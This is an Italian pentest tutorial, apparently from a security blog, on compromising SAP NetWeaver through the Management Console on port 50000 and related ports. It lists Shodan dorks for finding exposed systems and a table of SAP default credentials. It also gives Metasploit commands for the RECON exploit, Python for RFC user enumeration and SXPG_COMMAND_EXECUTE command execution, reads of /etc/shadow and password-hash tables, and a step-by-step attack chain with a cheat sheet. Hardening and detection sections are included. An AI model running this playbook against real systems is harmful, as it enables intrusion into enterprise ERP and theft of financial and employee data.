---
title: 'Porta 50000 SAP NetWeaver: da SAP* Default a RCE su ERP Enterprise'
slug: porta-50000-sap
description: 'SAP Management Console sulla 50000 senza auth: enumera versioni, sfrutta RECON (CVSS 10), abusa RFC con SAP*/06071992 e ottieni OS command execution su tutti i dati ERP.'
image: /porta-50000-sap.webp
draft: true
date: 2026-04-21T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - active-directory
  - sap
---

SAP è il software ERP (Enterprise Resource Planning) più usato dalle grandi aziende: gestisce finanza, risorse umane, supply chain, vendite, produzione — il cuore operativo dell'impresa. La porta 50000 TCP è la **SAP Management Console** (SAP MC), l'interfaccia HTTP per la gestione delle istanze SAP NetWeaver. Ma l'ecosistema SAP espone decine di porte: 3200-3299 (SAP GUI), 3300-3399 (SAP Gateway), 8000-8099 (ICM HTTP), 44300 (ICM HTTPS), 50013 (Management Console HTTPS) e la famigerata 3299 (SAP Router). Nel penetration testing, SAP è il jackpot enterprise: compromettere SAP significa accesso a **tutti i dati finanziari, HR, supply chain, vendite** dell'azienda. Un singolo sistema SAP contiene più dati sensibili di tutti gli altri server messi insieme.

La complessità di SAP è leggendaria — e la sua sicurezza ne risente. Centinaia di parametri, decine di componenti, patching complesso, configurazioni legacy — gli admin SAP faticano a tenere tutto aggiornato. E le vulnerabilità vengono scoperte continuamente.

Un caso che mi ha segnato professionalmente: assessment per una multinazionale manifatturiera con 10.000 dipendenti. SAP Management Console sulla porta 50013 senza autenticazione. Dall'MC ho estratto la versione del kernel, lo stato dei processi, i profili di configurazione — e ho trovato che il SAP Gateway sulla 3300 accettava connessioni RFC esterne senza filtro. Con un RFC call alla funzione `BAPI_USER_GET_DETAIL` ho enumerato tutti gli utenti SAP. L'utente `SAP*` aveva ancora la password di default `06071992`. Da SAP\* → SE37 → OS command execution → shell → tutti i dati finanziari degli ultimi 15 anni.

## Cos'è la Porta 50000?

La porta 50000 TCP è la porta di default della **SAP Management Console** (SAP MC), un'interfaccia HTTP che permette di monitorare e gestire le istanze SAP NetWeaver Application Server. La Management Console espone informazioni sullo stato dei processi SAP, versioni del kernel, parametri di configurazione e log — spesso senza autenticazione. Nell'ecosistema SAP, la porta 50000 è il punto di ingresso per l'enumerazione dell'infrastruttura ERP enterprise.

> **La porta 50000 è pericolosa?**
> Sì, se la SAP Management Console non richiede autenticazione. Un attaccante può enumerare versioni (per CVE targeting), processi attivi, parametri di sicurezza e utenti. Combinata con altre porte SAP (3200, 3300, 8000), l'impatto è **information disclosure critica** che porta a **RCE** via RFC abuse, deserialization o OS command execution, con accesso a tutti i dati ERP dell'azienda.

## Come Verificare se SAP È Esposto su Internet

```bash
# Shodan
port:50000 "SAP"
port:50000 "sapmc"
port:3299 "SAProuter"
port:8000 "SAP NetWeaver"

# Censys
services.port=50000 AND services.http.response.body:"SAP Management Console"
services.port=3299 AND services.banner:"SAProuter"

# ZoomEye
port:50000 +"SAP Management Console"
port:3299 +SAProuter
```

SAP esposto su Internet è uno dei finding più critici possibili: l'ERP contiene i dati finanziari, HR e operativi di tutta l'azienda. Shodan indicizza centinaia di istanze SAP con Management Console accessibili, SAP Router aperti e servizi ICM raggiungibili. Ogni istanza esposta è un potenziale accesso a miliardi di euro di dati.

## 1. Enumerazione — Porte Ecosistema SAP

```bash
nmap -sV -p 3200-3299,3300-3399,8000-8099,44300,50000,50013,50014 10.10.10.40
```

| Porta       | Servizio           | Funzione                                                |
| ----------- | ------------------ | ------------------------------------------------------- |
| **50000**   | SAP MC (HTTP)      | Management Console                                      |
| 50013       | SAP MC (HTTPS)     | Management Console sicura                               |
| 3200-3299   | SAP GUI            | Connessione client SAPGUI (istanza 00=3200, 01=3201...) |
| 3300-3399   | SAP Gateway        | RFC/CPIC communication                                  |
| 8000-8099   | SAP ICM HTTP       | Web server integrato                                    |
| 44300-44399 | SAP ICM HTTPS      | Web server HTTPS                                        |
| 3299        | SAP Router         | Routing connessioni SAP                                 |
| 50014       | SAP MC HTTPS (alt) | Management Console alternativa                          |

### SAP Management Console

```bash
curl -s http://10.10.10.40:50000/ | head -50
```

Se mostra la dashboard SAP MC senza chiedere credenziali → information disclosure immediata.

### Versione e componenti

```bash
# Dall'MC web
curl -s "http://10.10.10.40:50000/?cmd=GetSystemInfo" | python3 -m json.tool

# Nmap scripts SAP
nmap -p 3299 --script sap-router-info 10.10.10.40
```

### SAP Router Info

```bash
# Se SAP Router è attivo
nmap -p 3299 --script sap-router-info 10.10.10.40

# Lista route SAP Router
python3 saprouter_scanner.py -H 10.10.10.40 -P 3299
```

## 2. Default Credentials SAP

SAP ha account di sistema con password di default che raramente vengono cambiate:

| Username        | Password default        | Client      | Ruolo                 |
| --------------- | ----------------------- | ----------- | --------------------- |
| `SAP*`          | `06071992` o `PASS`     | 000,001,066 | Super-admin SAP       |
| `DDIC`          | `19920706`              | 000,001     | Data Dictionary admin |
| `TMSADM`        | `PASSWORD` o `$1Pawd2&` | 000         | Transport Management  |
| `EARLYWATCH`    | `SUPPORT`               | 066         | Monitoring            |
| `SAPCPIC`       | `ADMIN`                 | 000         | CPI-C communication   |
| `J2EE_ADMIN`    | `j2ee_admin`            | —           | Java stack admin      |
| `ADMINISTRATOR` | `manage`                | —           | SAP MC default        |

```bash
# Test con saplogon (SAP GUI CLI)
# Oppure via RFC
python3 pysap/examples/router_password_check.py -H 10.10.10.40 -P 3299

# Metasploit
use auxiliary/scanner/sap/sap_mgmt_con_brute
set RHOSTS 10.10.10.40
run
```

### Via SAP GUI

```bash
# Connessione SAP GUI (necessita client)
sapgui 10.10.10.40 3200  # Istanza 00
# Login con SAP*/06071992 client 000
```

## 3. CVE Critiche SAP

### CVE-2020-6287 — RECON (CVSS 10.0)

Remote Code Execution pre-auth su SAP NetWeaver AS Java. Creazione di un utente admin senza credenziali via HTTP. Versioni: NetWeaver AS Java 7.30-7.50.

```bash
# Check
nmap -p 50000 --script http-sap-recon-check 10.10.10.40

# Metasploit
use exploit/multi/sap/sap_recon_cve_2020_6287
set RHOSTS 10.10.10.40
set RPORT 50000
run
```

### CVE-2022-22536 — ICMAD (CVSS 10.0)

HTTP Request Smuggling su SAP ICM (Internet Communication Manager). Pre-auth, memoria leak e potenziale RCE.

```bash
# Target: porta 8000 (ICM HTTP)
python3 icmad_scanner.py -H 10.10.10.40 -P 8000
```

### CVE-2023-23857 — SAP NetWeaver AS Java

Information disclosure e SSRF pre-auth su SAP NetWeaver 7.50.

### CVE-2025-31324 — SAP NetWeaver Visual Composer (CVSS 10.0)

Upload di file e RCE senza autenticazione via endpoint `/developmentserver/metadatauploader`. Sfruttata attivamente in-the-wild nel 2025.

```bash
# Check
curl -s http://10.10.10.40:8000/developmentserver/metadatauploader -I
# Se 200 → potenzialmente vulnerabile
```

## 4. RFC Abuse — Remote Function Call

Il SAP Gateway (porta 33XX) gestisce le chiamate RFC — funzioni remote che permettono di interagire con il sistema SAP. Se il gateway non filtra gli IP sorgente:

```bash
# Enumerazione utenti via RFC
python3 -c "
from pysap.SAPRFC import *
conn = RFCConnection('10.10.10.40', 3300)
conn.connect()
result = conn.call('BAPI_USER_GETLIST', MAX_ROWS=1000)
for user in result['USERLIST']:
    print(user['USERNAME'])
"
```

```bash
# Funzioni RFC pericolose
# RFC_READ_TABLE — leggi qualsiasi tabella SAP
# BAPI_USER_CREATE1 — crea utenti
# BAPI_USER_CHANGE — modifica utenti (resetta password)
# RFC_SYSTEM_INFO — informazioni sistema
# SXPG_COMMAND_EXECUTE — esecuzione comandi OS
```

### OS Command Execution via RFC

```bash
# Se hai accesso alla funzione SXPG_COMMAND_EXECUTE
# Esegui un comando OS definito nella tabella SXPG_COMMAND_TABLE
python3 sap_rfc_exec.py -H 10.10.10.40 -P 3300 -u SAP* -p 06071992 -c 000 \
  --function SXPG_COMMAND_EXECUTE --command DBEXPORT --args "id > /tmp/pwned"
```

### Transaction Code per pentest (da SAP GUI)

| TCode    | Funzione                                           |
| -------- | -------------------------------------------------- |
| `SE37`   | Function Module testing (esecui RFC)               |
| `SE16`   | Data Browser (leggi tabelle)                       |
| `SM59`   | RFC Destinations (credenziali verso altri sistemi) |
| `SM21`   | System Log                                         |
| `SU01`   | User Management                                    |
| `STRUST` | Trust Manager (certificati)                        |
| `SM50`   | Work Processes                                     |
| `AL11`   | File system browser                                |

### Tabelle SAP critiche

```sql
-- Via SE16 o RFC_READ_TABLE
USR02     -- Hash password utenti
AGR_1251  -- Autorizzazioni ruoli
RFCDES    -- RFC Destinations con credenziali
T000      -- Lista mandanti (client)
USR04     -- Profili utente
USRACL    -- Access Control List
```

## 5. SAP Management Console Exploitation

```bash
# Lista processi
curl -s "http://10.10.10.40:50000/?cmd=GetProcessList"

# Start/Stop processi (se write access)
curl -s "http://10.10.10.40:50000/?cmd=Stop&processname=disp+work.EXE"

# Log files
curl -s "http://10.10.10.40:50000/?cmd=GetLogFileList"
curl -s "http://10.10.10.40:50000/?cmd=ReadLogFile&name=dev_w0"

# Profili di configurazione
curl -s "http://10.10.10.40:50000/?cmd=GetProfileParameter&parameter=login/min_password_lng"
```

I parametri di configurazione rivelano: lunghezza minima password, lockout policy, versione kernel, path di installazione.

## 6. Micro Playbook Reale

**Minuto 0-5 → Fingerprint SAP**

```bash
nmap -sV -p 3200-3299,3300-3399,8000,44300,50000,50013 TARGET
curl -s http://TARGET:50000/ | head -50  # Management Console
curl -s http://TARGET:8000/ | head -50   # ICM
```

**Minuto 5-10 → Default credentials**

```bash
# SAP GUI con SAP*/06071992 su client 000
# MC con ADMINISTRATOR/manage
curl -s -u ADMINISTRATOR:manage http://TARGET:50000/
```

**Minuto 10-20 → CVE check**

```bash
nuclei -u http://TARGET:50000 -tags sap
nuclei -u http://TARGET:8000 -tags sap
searchsploit sap netweaver
```

**Minuto 20+ → RFC abuse se autenticato**

```bash
# Enumera utenti, leggi tabelle, cerca RFC destinations con credenziali
```

## 7. Caso Studio Concreto

**Settore:** Multinazionale manifatturiera, 10.000 dipendenti, 5 istanze SAP.

**Scope:** Pentest interno, postazione utente standard.

Scansione rete → SAP Management Console su `10.10.10.100:50013` senza auth. Dall'MC ho estratto: versione kernel 7.53 (patch level basso), 4 work process attivi, parametri di sicurezza (lunghezza minima password: 6 caratteri, no lockout policy configurata).

SAP Gateway sulla 3300 accettava RFC esterne. Con `BAPI_USER_GETLIST` ho enumerato 2400 utenti SAP. Ho testato `SAP*:06071992` su client 000 → **login riuscito**. Da SAP\* ho aperto la transazione SE16 → tabella `RFCDES` → 12 RFC Destinations verso altri sistemi SAP e database [Oracle](https://hackita.it/articoli/porta-1521-oracle) con credenziali in chiaro. La tabella `USR02` conteneva gli hash password di tutti i 2400 utenti.

Con `SXPG_COMMAND_EXECUTE` ho ottenuto OS command execution come utente `<sid>adm` → shell → `/etc/shadow` → [Hashcat](https://hackita.it/articoli/hashcat) → root.

Il sistema SAP conteneva: 15 anni di dati finanziari, stipendi di 10.000 dipendenti, contratti fornitori, ordini di acquisto, dati clienti.

**Tempo dal primo scan alla shell:** 40 minuti. **Root cause:** SAP\*/06071992 mai cambiata, SAP Gateway senza filtro IP, Management Console senza auth.

## 8. Errori Comuni Reali Trovati nei Pentest

*1. SAP con password di default (50%+ delle installazioni)*\*
L'utente `SAP*` ha password `06071992` o `PASS` dalla nascita del sistema. Disabilitarlo non basta — va lockato su ogni client (000, 001, 066 e tutti i custom).

**2. SAP Gateway senza filtro (reginfo/secinfo)**
Il Gateway accetta RFC da qualsiasi IP. I file `reginfo` e `secinfo` che dovrebbero filtrare le connessioni sono vuoti o con wildcard.

**3. Management Console senza autenticazione**
Espone versioni, processi, parametri e log — intelligence perfetta per preparare l'attacco.

**4. RFC Destinations con credenziali in chiaro**
La transazione SM59 (o tabella RFCDES) contiene username e password per connettersi ad altri sistemi SAP e database — lateral movement istantaneo.

**5. Patching in ritardo di anni**
SAP rilascia patch mensili (Security Notes), ma applicarle richiede downtime e testing — molte aziende hanno 1-3 anni di patch arretrate. CVE come RECON (2020) sono ancora sfruttabili nel 2026.

**6. SAP ICM esposto su Internet**
La porta 8000/44300 (web server SAP) esposta per applicazioni web — ma espone anche endpoint di amministrazione e API vulnerabili.

## 9. Indicatori di Compromissione (IoC)

* *Login SAP su client 000*\* — nei Security Audit Log (SM20): logon di SAP\* da IP non autorizzati
* **RFC call anomale** — chiamate a `RFC_READ_TABLE`, `SXPG_COMMAND_EXECUTE`, `BAPI_USER_CREATE1` da IP sconosciuti
* **Accesso alla tabella USR02** — lettura hash password è un segnale di compromissione
* **Nuovi utenti creati** via `SU01` o `BAPI_USER_CREATE1` da utenti non HR
* **Processi OS anomali** — comandi eseguiti via SXPG come `bash`, `cmd.exe`, `wget`
* **Connessioni SAP Gateway** da IP fuori dal range autorizzato — log del gateway (`dev_rd`)
* **Accesso alla tabella RFCDES** — lettura delle RFC Destinations con credenziali
* **File system access** via `AL11` a percorsi non standard — `/tmp/`, `/etc/shadow`

## 10. Mini Chain Offensiva Reale

```
SAP MC :50000 → Version Info → SAP Gateway :3300 → RFC User Enum → SAP*/06071992 → SE16 → RFCDES Creds → Oracle DB → OS Command → Shell
```

**Step 1 — Fingerprint**

```bash
curl -s http://10.10.10.100:50000/?cmd=GetSystemInfo
# → Kernel 7.53, patch level 0, SAP NetWeaver 7.50
```

**Step 2 — Default credentials**

```bash
# SAP GUI: SAP* / 06071992 / client 000
# → Login riuscito → profilo SAP_ALL
```

**Step 3 — Enumera utenti e tabelle**

```
SE16 → USR02 → 2400 hash password
SE16 → RFCDES → 12 RFC Destinations con credenziali
SM59 → Oracle DB: DBA_USER / Dba_Pr0d_2020!
```

**Step 4 — Lateral movement Oracle**

```bash
sqlplus DBA_USER/Dba_Pr0d_2020!@10.10.10.120:1521/PROD
# → Accesso database finanziario
```

**Step 5 — OS command execution**

```
SE37 → SXPG_COMMAND_EXECUTE → id; cat /etc/shadow
# → shell come <sid>adm → privilege escalation → root
```

Da SAP Management Console → Domain dei dati finanziari di 15 anni.

## 11. Detection & Hardening

* **Cambia TUTTE le password default** — SAP\*, DDIC, TMSADM, EARLYWATCH su tutti i client
* **Blocca SAP Gateway** — configura `reginfo` e `secinfo` con IP autorizzati
* **Auth sulla Management Console** — richiedi credenziali per accedere
* **Patch** — applica le SAP Security Notes mensili
* **Non esporre su Internet** — porte SAP solo via VPN o rete interna
* **Monitora SM20** — Security Audit Log per login anomali
* **Limita RFC** — autorizza solo le funzioni necessarie per utente
* **Cifra RFC Destinations** — usa Secure Network Communications (SNC)
* **Rimuovi utente SAP**\* — o lockalo su tutti i client
* **Firewall** — segmenta la rete SAP dal resto dell'infrastruttura

## 12. Mini FAQ

**SAP è davvero così vulnerabile?**
SAP stesso non è insicuro — ma la sua complessità rende facile lasciare configurazioni deboli. Account di default non cambiati, gateway non filtrati, patch non applicate — sono errori di configurazione, non bug del software. Ma il risultato è lo stesso: compromissione totale.

**Serve il SAP GUI per fare pentest?**
Non necessariamente — molti attacchi passano per HTTP (Management Console, ICM) e RFC (da script Python con pysap). Ma il SAP GUI con accesso SAP\* permette di navigare l'intero sistema in modo interattivo — transazioni, tabelle, funzioni. È il tool più completo.

**Quali dati trovo in SAP?**
Tutto ciò che un'azienda gestisce: stipendi e dati HR di tutti i dipendenti, fatture e pagamenti, contratti fornitori, ordini clienti, piani di produzione, dati logistici, reporting finanziario. SAP è letteralmente il cervello operativo dell'impresa.

## 13. Cheat Sheet Finale

| Azione         | Comando                                                         |
| -------------- | --------------------------------------------------------------- |
| Nmap SAP       | `nmap -sV -p 3200-3299,3300-3399,8000,44300,50000,50013 target` |
| MC info        | `curl http://target:50000/?cmd=GetSystemInfo`                   |
| MC processi    | `curl http://target:50000/?cmd=GetProcessList`                  |
| MC log         | `curl http://target:50000/?cmd=ReadLogFile&name=dev_w0`         |
| Default SAP\*  | `SAP* / 06071992 / client 000`                                  |
| Default DDIC   | `DDIC / 19920706 / client 000`                                  |
| SAP Router     | `nmap -p 3299 --script sap-router-info target`                  |
| MSF RECON      | `use exploit/multi/sap/sap_recon_cve_2020_6287`                 |
| Nuclei         | `nuclei -u http://target:50000 -tags sap`                       |
| Searchsploit   | `searchsploit sap netweaver`                                    |
| RFC user enum  | `BAPI_USER_GETLIST` via pysap                                   |
| RFC read table | `RFC_READ_TABLE` → `USR02, RFCDES`                              |
| RFC OS cmd     | `SXPG_COMMAND_EXECUTE`                                          |
| TCode users    | `SU01`                                                          |
| TCode tables   | `SE16`                                                          |
| TCode RFC dest | `SM59`                                                          |

***

Riferimento: SAP Security Notes, OWASP SAP Security, pysap, ERPScan, HackTricks SAP. Uso esclusivo in ambienti autorizzati.

> SAP è il cuore della tua azienda — e l'utente SAP\* ha ancora la password del 1992? [Penetration test SAP HackIta](https://hackita.it/servizi) specializzato in ambienti ERP enterprise. Per padroneggiare l'exploitation SAP: [formazione 1:1 avanzata](https://hackita.it/formazione).
